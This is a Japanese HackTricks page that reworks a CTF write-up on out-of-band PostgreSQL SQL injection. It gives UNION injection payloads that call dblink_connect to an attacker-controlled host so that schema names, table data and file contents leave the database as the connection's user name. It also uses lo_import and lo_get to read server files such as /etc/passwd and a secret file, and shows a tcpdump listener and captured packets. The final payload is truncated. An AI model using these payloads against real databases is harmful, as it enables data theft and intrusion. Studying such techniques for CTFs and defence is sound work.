# dblink/lo\_importデータの漏洩

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション

- [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

**これは、`lo_import`を使用してデータベースにファイルをロードし、`dblink_connect`を使用してそれらを漏洩させる方法の例です。**

## 漏洩サーバー/非同期SQLインジェクションの準備

**抽出元:** [**https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md**](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

`pg_sleep`も遅延を引き起こさないため、クエリの実行がバックグラウンドまたは非同期で行われると安全に推定できます。

通常、`dblink_connect`はリモートのPostgreSQLデータベースに永続的な接続を開くために使用できます（例：`SELECT dblink_connect('host=HOST user=USER password=PASSWORD dbname=DBNAME')`）。この関数のパラメータを制御できるため、SQL Server Side Request Forgeryを自分自身のホストに対して実行できます。つまり、SQLクエリの結果からデータを漏洩させるためにOut-of-Band SQLインジェクションを実行できます。少なくとも、次の2つの方法があります。

1. **DNSサーバー**を設定し、`[data].our.domain`への接続をトリガーすることで、ログやDNSネットワークパケットでデータを表示できます。
2. **パブリックなPostgreSQLサーバーを設定し、PostgreSQLポートへの着信ネットワークパケットを監視**し、漏洩したデータを`user`/`dbname`としてホストへの接続をトリガーします。**デフォルトでは**、PostgreSQLは通信にSSLを使用しないため、ネットワーク上で`user`/`dbname`を**平文**で見ることができます。

**2番目の方法の方が簡単**です。ドメインは必要ありません。パブリックIPを持つサーバーを設定し、PostgreSQLをインストールし、PostgreSQLサービスを\*/0.0.0.0でリッスンするように設定し、ネットワークダンパー（例：tcpdump）を実行してPostgreSQLポート（デフォルトで5432）へのトラフィックを監視するだけです。

PostgreSQLを**パブリックにリッスン**するには、`postgresql.conf`の`listen_addresses`を`*`に設定します。
```
listen_addresses = '*'
```
入力トラフィックを監視するために、ポート5432を監視するために`tcpdump`を実行します。
```
sudo tcpdump -nX -i eth0 port 5432
```
ターゲットからの接続を確認するために、次のクエリを試してみることができます。
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=farisv password=postgres dbname=hellofromfb')) --
```
成功すれば、読み取り可能な `user` と `dbname` を持つネットワークパケットの一部を取得します。
```
17:14:11.267060 IP [54.185.163.254.50968] > [REDACTED]: Flags [P.], seq 1:43, ack 1, win 229, options [nop,nop,TS val 970078525 ecr 958693110], length 42
0x0000:  4500 005e 9417 4000 2706 248c 36b9 a3fe  E..^..@.'.$.6...
0x0010:  9de6 2259 c718 2061 5889 142a 9f8a cb5d  .."Y...aX..*...]
0x0020:  8018 00e5 1701 0000 0101 080a 39d2 393d  ............9.9=
0x0030:  3924 7ef6 0000 002a 0003 0000 7573 6572  9$~....*....user
0x0040:  0066 6172 6973 7600 6461 7461 6261 7365  .farisv.database
0x0050:  0068 656c 6c6f 6672 6f6d 6662 0000       .hellofromfb.
```
次に、いくつかのPostgreSQLクエリを使用してデータベースを抽出し続けることができます。空白を含むクエリ結果に対しては、`encode`関数を使用して結果を**hex/base64**に変換するか、`replace`関数を使用して空白を他の文字に置き換える必要があります。なぜなら、これらの処理中に`dblink_connect`プロセスで実行エラーが発生するからです。

**スキーマのリスト**を取得します：
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(schema_name,':') FROM information_schema.schemata) || ' password=postgres dbname=postgres')) --
```

```
17:36:46.538178 IP 54.185.163.254.51018 > [REDACTED]: Flags [P.], seq 1:70, ack 1, win 229, options [nop,nop,TS val 971433789 ecr 960048322], length 69
0x0000:  4500 0079 ecd5 4000 2706 cbb2 36b9 a3fe  E..y..@.'...6...
0x0010:  9de6 2259 c74a 2061 1e74 4769 b404 803d  .."Y.J.a.tGi...=
0x0020:  8018 00e5 2710 0000 0101 080a 39e6 e73d  ....'.......9..=
0x0030:  3939 2cc2 0000 0045 0003 0000 7573 6572  99,....E....user
0x0040:  0070 7562 6c69 633a 696e 666f 726d 6174  .public:informat
0x0050:  696f 6e5f 7363 6865 6d61 3a70 675f 6361  ion_schema:pg_ca
0x0060:  7461 6c6f 6700 6461 7461 6261 7365 0070  talog.database.p
0x0070:  6f73 7467 7265 7300 00                   ostgres.
```
現在のスキーマのテーブルの一覧を取得します：
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(tablename, ':') FROM pg_catalog.pg_tables WHERE schemaname=current_schema()) || ' password=postgres dbname=postgres')) --
```

```
17:38:30.515438 IP 54.185.163.254.51026 > [REDACTED]: Flags [P.], seq 1:42, ack 1, win 229, options [nop,nop,TS val 971537775 ecr 960152304], length 41
0x0000:  4500 005d f371 4000 2706 c532 36b9 a3fe  E..].q@.'..26...
0x0010:  9de6 2259 c752 2061 8dd4 e226 24a3 a5c5  .."Y.R.a...&$...
0x0020:  8018 00e5 fe2b 0000 0101 080a 39e8 7d6f  .....+......9.}o
0x0030:  393a c2f0 0000 0029 0003 0000 7573 6572  9:.....)....user
0x0040:  0073 6561 7263 6865 7300 6461 7461 6261  .searches.databa
0x0050:  7365 0070 6f73 7467 7265 7300 00         se.postgres.
```
**searches** テーブルの **行数** を **カウント** します。
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT COUNT(*) FROM searches) || ' password=postgres dbname=postgres')) --
```

```
17:42:39.511643 IP 54.185.163.254.51034 > [REDACTED]: Flags [P.], seq 1:35, ack 1, win 229, options [nop,nop,TS val 971786760 ecr 960401280], length 34
0x0000:  4500 0056 7982 4000 2706 3f29 36b9 a3fe  E..Vy.@.'.?)6...
0x0010:  9de6 2259 c75a 2061 5ec0 7df0 8611 357d  .."Y.Z.a^.}...5}
0x0020:  8018 00e5 f855 0000 0101 080a 39ec 4a08  .....U......9.J.
0x0030:  393e 8f80 0000 0022 0003 0000 7573 6572  9>....."....user
0x0040:  0030 0064 6174 6162 6173 6500 706f 7374  .0.database.post
0x0050:  6772 6573 0000                           gres.
```
現在のスキーマには空のテーブルが1つしかなく、フラグはデータベースにありません。したがって、`/var/lib/postgresql/data/secret`からデータを外部に持ち出す必要があるかもしれません。残念ながら、`pg_read_file`や`pg_read_binary_file`を使用してファイルを読み取ろうとすると、受信接続がないため、現在のユーザーがこれらの関数を使用する権限を持っていない可能性があります。

#### postdresqlを使用した非同期SQLインジェクションの詳細情報

* [https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

## **大きなオブジェクトの内容を外部に持ち出す**

大きなオブジェクトを使用してファイルを読み取ることができます（[https://www.postgresql.org/docs/11/lo-funcs.html](https://www.postgresql.org/docs/11/lo-funcs.html)）。`lo_import`を使用してファイルの内容を`pg_largeobject`カタログにロードすることができます。クエリが成功した場合、オブジェクトの`oid`を取得します。
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT lo_import('/var/lib/postgresql/data/secret')) || ' password=postgres dbname=postgres')) --
```

```
17:54:51.963925 IP 54.185.163.254.51046 > [REDACTED]: Flags [P.], seq 1:39, ack 1, win 229, options [nop,nop,TS val 972519214 ecr 961133706], length 38
0x0000:  4500 005a 071f 4000 2706 b188 36b9 a3fe  E..Z..@.'...6...
0x0010:  9de6 2259 c766 2061 26fb c8a7 bbb3 fe01  .."Y.f.a&.......
0x0020:  8018 00e5 2272 0000 0101 080a 39f7 772e  ...."r......9.w.
0x0030:  3949 bc8a 0000 0026 0003 0000 7573 6572  9I.....&....user
0x0040:  0032 3436 3638 0064 6174 6162 6173 6500  .24668.database.
0x0050:  706f 7374 6772 6573 0000                 postgres..
```
`oid`として24668を取得したので、`lo_import`関数を使用できます。残念ながら、`lo_get(24668)`を使用して大きなオブジェクトの内容を取得しようとしても、または`pg_largeobject`カタログに直接アクセスしようとしても、結果は得られません。**現在のユーザーには新しいオブジェクトの内容を読み取る権限がないようです。**

PostgreSQLの大きなオブジェクトのドキュメントを読んだ後、**大きなオブジェクトにはACL（アクセス制御リスト）が存在する**ことがわかります。つまり、現在のユーザーが読み取りを許可されているACLを持つ古いオブジェクトがあれば、そのオブジェクトの内容を外部に漏洩させることができます。

`pg_largeobject_metadata`から利用可能な大きなオブジェクトの`oid`のリストを取得することができます。
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(cast(l.oid as text), ':') FROM pg_largeobject_metadata l) || ' password=postgres dbname=postgres')) --
```

```
18:06:57.172285 IP 54.185.163.254.51052 > [REDACTED]: Flags [.], seq 1:2897, ack 1, win 229, options [nop,nop,TS val 973244413 ecr 961858878], length 2896
0x0000:  4500 0b84 7adf 4000 2606 339e 36b9 a3fe  E...z.@.&.3.6...
0x0010:  9de6 2259 c76c 2061 8d76 e934 10c9 3972  .."Y.l.a.v.4..9r
0x0020:  8010 00e5 a66d 0000 0101 080a 3a02 87fd  .....m......:...
0x0030:  3954 cd3e 0000 1c94 0003 0000 7573 6572  9T.>........user
0x0040:  0031 3635 3731 3a31 3634 3339 3a31 3635  .16571:16439:165
0x0050:  3732 3a31 3634 3431 3a31 3634 3432 3a31  72:16441:16442:1
0x0060:  3733 3732 3a31 3634 3434 3a31 3634 3435  7372:16444:16445
0x0070:  3a31 3831 3534 3a31 3733 3830 3a31 3737  :18154:17380:177
0x0080:  3038 3a31 3635 3737 3a31 3634 3530 3a31  08:16577:16450:1
0x0090:  3634 3531 3a31 3634 3532 3a31 3634 3533  6451:16452:16453

.....
.....
.....
```
私たちはいくつかの`oid`を手に入れました。オブジェクトの内容を読み込むために`lo_get`を使用してみることができます。例えば、`lo_get(16439)`は`/etc/passwd`の内容を読み込みます。`lo_gets`の結果は`bytea`なので、クエリに追加するために`UTF8`に変換する必要があります。

フラグファイルが以前に読み込まれたかどうかを確認するために、最も低い`oid`を持ついくつかのオブジェクトを読み込んでみることができます。フラグファイルオブジェクトは`oid` 16444で存在します。フラグには空白がないので、そのまま表示することができます。

フラグを読み込むためには:
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT convert_from(lo_get(16444), 'UTF8')) || ' password=postgres dbname=p
```
#### oidの詳細情報：

* [https://balsn.tw/ctf\_writeup/20190603-facebookctf/#hr\_admin\_module](https://balsn.tw/ctf\_writeup/20190603-facebookctf/#hr\_admin\_module)
* [https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>
